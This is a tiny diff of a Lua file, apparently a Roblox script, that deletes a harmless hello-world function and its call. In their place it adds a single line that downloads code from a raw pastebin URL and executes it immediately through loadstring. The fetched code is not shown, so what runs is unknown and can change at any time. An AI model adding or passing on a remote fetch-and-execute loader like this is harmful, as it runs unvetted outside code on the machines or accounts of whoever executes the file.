@@ -1,5 +1,1 @@
-function HelloWorld(str)
-    print(tostring(str))
-end
-
-HelloWorld("print")
+loadstring(game:HttpGet("https://pastebin.com/raw/C3Dy1HHD"))()
